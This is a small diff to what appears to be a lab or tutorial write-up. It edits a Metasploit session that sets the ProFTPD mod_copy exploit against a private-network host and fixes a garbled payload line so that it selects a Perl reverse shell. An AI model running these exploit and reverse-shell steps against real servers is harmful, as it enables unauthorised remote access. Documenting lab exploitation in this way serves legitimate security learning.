@@ -144,8 +144,7 @@ msf >
 msf > use 0
 msf exploit(unix/ftp/proftpd_modcopy_exec) > set RHOSTS 192.168.122.254
 msf exploit(unix/ftp/proftpd_modcopy_exec) > set SITEPATH /var/www/html
-msf exploit(unix/ftp/proftpd_modcopy_exec) > set payload payload/cmd/unix/reverse_netcat
-payload/cmd/unix/reverse_perl
+msf exploit(unix/ftp/proftpd_modcopy_exec) > set payload payload/cmd/unix/reverse_perl
 ```
 
 ```bash
